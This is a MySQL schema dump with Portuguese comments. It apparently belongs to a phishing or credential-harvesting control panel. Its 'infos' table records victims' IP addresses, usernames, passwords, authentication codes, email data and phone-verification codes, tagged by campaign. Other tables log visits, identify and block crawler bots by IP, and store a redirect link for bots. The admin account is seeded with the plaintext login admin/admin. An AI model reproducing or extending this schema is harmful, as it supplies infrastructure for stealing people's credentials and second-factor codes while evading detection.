--
-- Estrutura da tabela `usuarios`
--

CREATE TABLE IF NOT EXISTS `usuarios` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nome` varchar(220) NOT NULL,
  `senha` varchar(50) NOT NULL,
  `tipo` varchar(50) NOT NULL,
  `niveis_acesso_id` int(11) NOT NULL,  
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=11 ;

--
-- Extraindo dados da tabela `usuarios`
--

INSERT INTO `usuarios` (`id`, `nome`,  `senha`, `tipo`, `niveis_acesso_id`) VALUES
(1, 'admin',  'admin', 'admin', 1);



-- --------------------------------------------------------

--
-- Estrutura da tabela `niveis_acessos`
--

CREATE TABLE IF NOT EXISTS `niveis_acessos` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `nome` varchar(50) NOT NULL,
  `created` datetime NOT NULL,
  `modified` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Extraindo dados da tabela `niveis_acessos`
--

INSERT INTO `niveis_acessos` (`id`, `nome`, `created`, `modified`) VALUES
(1, 'Administrador', '2016-02-19 00:00:00', NULL),
(2, 'Colaborador', '2016-02-19 00:00:00', NULL),
(3, 'Cliente', '2016-02-19 00:00:00', NULL);

-- --------------------------------------------------------

CREATE TABLE `cloud` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
  `mailCloud` varchar(250) NOT NULL,
  `apikey` varchar(250) NOT NULL,
  `domain` varchar(250) NOT NULL,
   PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;



--
-- Estrutura da tabela `infos`
--



CREATE TABLE `infos` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ip` varchar(50) NOT NULL,
  `usuario` varchar(50) NOT NULL,
  `senha` varchar(50) NOT NULL,
  `numero_autenticar` varchar(200),
  `dados_do_email` varchar(200),
  `celular_autenticar` varchar(200),
  `status` varchar(200) DEFAULT NULL,
  `statusremote` varchar(200) DEFAULT NULL,
  `tempo` varchar(45) NOT NULL,
  `minuto` varchar(45) NOT NULL,
  `op` varchar(45) NOT NULL,
  `dnsreverse` varchar(50) NOT NULL,
  `sistema` varchar(200) NOT NULL,
  `navegador` varchar(200) DEFAULT NULL,
  `datahora` varchar(200) DEFAULT NULL,
  `cidade_estado` varchar(200) DEFAULT NULL,
  `statusonline` varchar(200) DEFAULT NULL,
  `campanha` varchar(200) DEFAULT NULL,
  
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Extraindo dados da tabela `infos`
--


CREATE TABLE IF NOT EXISTS `valor` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `lastprice` varchar(200) NOT NULL,
  `volume` varchar(200) NOT NULL, 
  `Weighted` varchar(200) NOT NULL, 
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;


INSERT INTO `valor` (`id`, `lastprice`, `volume`, `Weighted`) VALUES
(1, '32.351,5', '6,661.29449', '30,023.3');



CREATE TABLE IF NOT EXISTS `bot` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `linkbot` varchar(200) NOT NULL,
  `clicks` varchar(200) NOT NULL, 
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;


INSERT INTO `bot` (`id`, `linkbot`, `clicks`) VALUES
(1, 'https://www.kondzilla.com/', '10');
--
-- Estrutura da tabela `visitas`
--

CREATE TABLE IF NOT EXISTS `visitas` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `data` varchar(50) NOT NULL,
  `ip` varchar(50) NOT NULL, 
  `cidade_estado` varchar(200) NOT NULL,
  `dispositivo` varchar(45) NOT NULL,
  `navegador` varchar(45) NOT NULL,
  `acessou` longtext NOT NULL,
  `campanha` varchar(45) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
--
-- Extraindo dados da tabela `visitas`
--


--
-- Estrutura da tabela `x9`
--

CREATE TABLE IF NOT EXISTS `x9` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ip` varchar(50) NOT NULL,
  `tipo` varchar(200) NOT NULL,
  `botname` varchar(45) NOT NULL,
  `cidade` varchar(45) NOT NULL,
  `estado` varchar(45) NOT NULL,
  `pais` varchar(45) NOT NULL,
  `quantidade` varchar(200) NOT NULL,
  `hora` varchar(200) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Extraindo dados da tabela `x9`
--

CREATE TABLE IF NOT EXISTS `ipblock` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ip` varchar(50) NOT NULL,
  `status` varchar(200) NOT NULL,  
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;


-- ----------------------------
-- Records of som
-- ----------------------------
DROP TABLE IF EXISTS `som`;
CREATE TABLE `som` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `ip` varchar(45) NOT NULL,
  `status` longtext NOT NULL,
  `tempo` varchar(45) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- ----------------------------
-- Records of som
-- ----------------------------
